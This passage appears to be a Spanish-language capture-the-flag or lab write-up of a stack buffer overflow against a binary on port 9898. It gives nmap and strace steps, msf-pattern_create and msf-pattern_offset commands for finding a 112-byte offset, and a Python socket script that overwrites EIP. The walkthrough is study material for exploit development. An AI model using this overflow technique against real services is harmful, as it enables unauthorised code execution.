Hacemos el escaneo de nmap:
![[Pasted image 20230902103757.png]]
![[Pasted image 20230902103933.png]]
![[Pasted image 20230902103953.png]]
Y vemos que el login como anonymous está habilitado:
![[Pasted image 20230902104039.png]]
Si ejecutamos ese binario, vemos que no ocurre nada aparentemente:
![[Pasted image 20230902104134.png]]
Y con la herramienta strace vemos que se esto levanta un puerto, el 9898 dentro del localhost:
![[Pasted image 20230902104305.png]]
Por lo que probamos en conectarnos y vemos que funciona:
![[Pasted image 20230902104338.png]]
De todos modos esto mismo corre en la máquina por el puerto 9898 (como también vimos con nmap):
![[Pasted image 20230902104434.png]]
En este punto, es posible que este binario admita un número determinado de caracteres, de tal forma que por ejemplo si ponemos algo no esperado nos sale el siguiente mensaje:
![[Pasted image 20230902105248.png]]
Pero si ponemos una cadena de caracteres mucho mayor, el binario se corrompe y se cierra:
![[Pasted image 20230902105325.png]]
## OBTENER EL OFFSET
Tenemos que obtener un dato llamado offset, y para ello primero vamos a usar una herramienta para generar el payload del bof:
```bash
msf-pattern_create -l 2000
```
![[Pasted image 20230902111740.png]]
Una vez con esto, vamos a ejecutar una herramienta llamada gdb donde vamos a pasarle este dato (en la parte de abajo le pegamos el payload anterior y arriba vemos que obtenemos un cópdigo):
![[Pasted image 20230902111834.png]]
Ese código lo pasamos por una herramienta llamada msf-pattern_offset que nos permitirá conocer el offset:
```bash
msf-pattern_offset -l 2000 -q 0x64413764
```
![[Pasted image 20230902111905.png]]
## CONTROLAR EL EIP
Ahora el siguiente paso será crear un script de python para controlar el EIP usando el offset obtenido anteriormente:
![[Pasted image 20230902112022.png]]
```python
#!/usr/bin/python

import sys,socket

shellcode = 'A'*112 + 'B'*4 + "\x90"*32 #if done correctly, you should see the EIP filled with 42424242

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9898))
    s.send((shellcode))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()
```
Hay que tener en cuenta que le ponemos 112 porque es el offset obtenido anteriormente:
![[Pasted image 20230902112229.png]]
